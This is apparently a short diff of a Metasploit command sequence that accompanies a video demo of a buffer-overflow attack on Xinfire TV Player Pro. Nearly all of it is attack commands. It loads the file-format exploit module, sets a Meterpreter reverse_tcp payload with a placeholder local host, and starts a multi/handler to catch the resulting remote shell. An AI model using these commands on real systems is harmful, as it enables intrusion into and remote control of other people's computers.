@@ -1,11 +1,17 @@
 use exploit/windows/fileformat/xinfire_tv_player
+
 set payload windows/meterpreter/reverse_tcp
+
 set lhost (IP of Local Host)
+
 exploit
 
 use exploit/multi/handler
+
 set payload windows/meterpreter/reverse_tcp
+
 set lhost (IP of Local Host)
+
 exploit
 
 Video demo Buffer Overflow Xinfire TV Player Pro
